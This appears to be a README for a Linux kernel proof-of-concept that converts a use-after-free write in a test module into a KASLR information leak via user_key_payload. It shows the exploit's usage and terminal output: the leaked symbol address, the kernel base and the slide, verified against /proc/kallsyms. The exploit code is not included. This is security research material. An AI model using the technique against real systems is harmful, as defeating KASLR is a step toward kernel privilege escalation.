# same_cache_write_leak_user_key

>Same cache UAF write information leak pOc using user_key_payload. No LPE, just info leak. Converting an UAF write into information leak.
This demo is for Linux 7.0.

Compile the LKM and then insmod before run the exploit.

<pre>
Checking : 
┌──(robohax㉿robohax-20bws2ng00)-[/run/…/Desktop/KERNEL/STANDARD/linux-7.0]
└─$ nm vmlinux | grep -w user_free_payload_rcu
ffffffff81aeee20 t user_free_payload_rcu

Test :
robohax@robohax-standardpc:~/Desktop/sheaf_uaf/same_cache_write_leak_user_key/exploit$ ./leak 0xffffffff81aeee20
[*] running UAF-write KASLR leak (up to 80 attempts)...
[+] leaked user_free_payload_rcu = 0xffffffffa94eee20
[+] kaslr text base              = 0xffffffffa8a00000
[+] kaslr slide                  = 0x0000000027a00000

Verify ?
robohax@robohax-standardpc:~/Desktop/sheaf_uaf/same_cache_write_leak_user_key/exploit$ sudo cat /proc/kallsyms | grep user_free_payload_rcu
ffffffffa94eee20 t user_free_payload_rcu
robohax@robohax-standardpc:~/Desktop/sheaf_uaf/same_cache_write_leak_user_key/exploit$ 

Slide is correct ? how do I know ? Easy !
0x0000000027a00000 is 2 MB aligned ? Check : 
  0x0000000027a00000 mod 0x200000 = 0 ?
Use calc ! or online : https://www.rapidtables.com/calc/math/hex-calculator.html?num1=0x0000000027a00000&op=4&num2=0x200000
</pre>


